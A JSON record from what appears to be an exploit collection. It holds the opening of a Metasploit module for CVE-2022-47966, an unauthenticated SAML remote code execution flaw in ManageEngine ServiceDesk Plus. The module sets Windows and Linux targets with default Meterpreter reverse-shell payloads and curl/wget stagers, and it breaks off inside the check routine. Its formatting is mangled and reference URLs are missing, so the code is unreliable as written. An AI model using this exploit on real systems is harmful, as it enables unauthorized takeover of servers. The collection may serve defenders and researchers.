{
    "text": "vul_name : Zoho ManageEngine ServiceDesk Plus 14003 Remote Code Execution ， vul_cve : CVE-2022-47966 ， vul_poc :  # This module requires Metasploit :  ，  # Current source :  ， class MetasploitModule < Msf : Exploit : Remote ， Rank = ExcellentRanking ， include Msf : Exploit : Remote : HttpClient ， include Msf : Exploit : CmdStager ， prepend Msf : Exploit : Remote : AutoCheck ， super (  ， update_info (  ， info ,  ， 'Name' => 'ManageEngine ServiceDesk Plus Unauthenticated SAML RCE' ,  ， 'Description' => %q{ ， This exploits an unauthenticated remote code execution vulnerability ， that affects Zoho ManageEngine ServiceDesk Plus versions 14003 and ， below ( CVE-2022-47966 ) . Due to a dependency to an outdated library ，  ( Apache Santuario version 1.4.1 )  , it is possible to execute arbitrary ， code by providing a crafted `samlResponse` XML to the ServiceDesk Plus ， SAML endpoint. Note that the target is only vulnerable if it has been ， configured with SAML-based SSO at least once in the past , regardless of ， the current SAML-based SSO status. ， } ,  ， 'Author' => [  ， 'Khoa Dinh' ,  # Original research ， 'horizon3ai' ,  # PoC ， 'Christophe De La Fuente' # Metasploit module ，  ]  ,  ， 'License' => MSF_LICENSE ,  ， ' ，  [ 'CVE' , '2022-47966' ]  ,  ，  [ 'URL' , ' ，  [ 'URL' , ' ，  [ 'URL' , ' ，  [ 'URL' , ' ，  ]  ,  ， 'Platform' => [ 'win' , 'unix' , 'linux' ]  ,  ， 'Payload' => { ， 'BadChars' => \"\\x27\" ， } ,  ， 'Targets' => [  ，  [  ， 'Windows EXE Dropper' ,  ， { ， 'Platform' => 'win' ,  ， 'Arch' => [ ARCH_X86 , ARCH_X64 ]  ,  ， 'Type' => : windows_dropper ,  ， 'DefaultOptions' => { 'Payload' => 'windows/x64/meterpreter/reverse_tcp' } ， } ，  ]  ,  ，  [  ， 'Windows Command' ,  ， { ， 'Platform' => 'win' ,  ， 'Arch' => ARCH_CMD ,  ， 'Type' => : windows_command ,  ， 'DefaultOptions' => { 'Payload' => 'cmd/windows/powershell/meterpreter/reverse_tcp' } ， } ，  ]  ,  ，  [  ， 'Unix Command' ,  ， { ， 'Platform' => 'unix' ,  ， 'Arch' => ARCH_CMD ,  ， 'Type' => : unix_cmd ,  ， 'DefaultOptions' => { 'Payload' => 'cmd/unix/python/meterpreter/reverse_tcp' } ， } ，  ]  ,  ，  [  ， 'Linux Dropper' ,  ， { ， 'Platform' => 'linux' ,  ， 'Arch' => [ ARCH_X86 , ARCH_X64 ]  ,  ， 'Type' => : linux_dropper ,  ， 'DefaultOptions' => { 'Payload' => 'linux/x64/meterpreter/reverse_tcp' } ,  ， 'CmdStagerFlavor' => %w [ curl wget echo lwprequest ]  ， } ，  ]  ，  ]  ,  ， 'DefaultOptions' => { ， 'RPORT' => 8080 ， } ,  ， 'DefaultTarget' => 1 ,  ， 'DisclosureDate' => '2023-01-10' ,  ， 'Notes' => { ， 'Stability' => [ CRASH_SAFE ,  ]  ,  ， 'SideEffects' => [ ARTIFACTS_ON_DISK , IOC_IN_LOGS ]  ,  ， 'Reliability' => [ REPEATABLE_SESSION ]  ， } ,  ， 'Privileged' => true ， register_options (  [  ， OptString.new ( 'TARGETURI' ,  [ true , 'The SAML endpoint URL' , '/SamlResponseServlet' ]  )  ,  ， OptInt.new ( 'DELAY' ,  [ true , 'Number of seconds to wait between each request' , 5 ]  )  ，  ]  )  ， end ， def check ， res = send_request_cgi (  ， 'method' => 'GET' ,  ， 'uri' => normalize_uri ( datastore [ 'TARGETURI' ]  ) ",
    "time": "2023.02.09"
}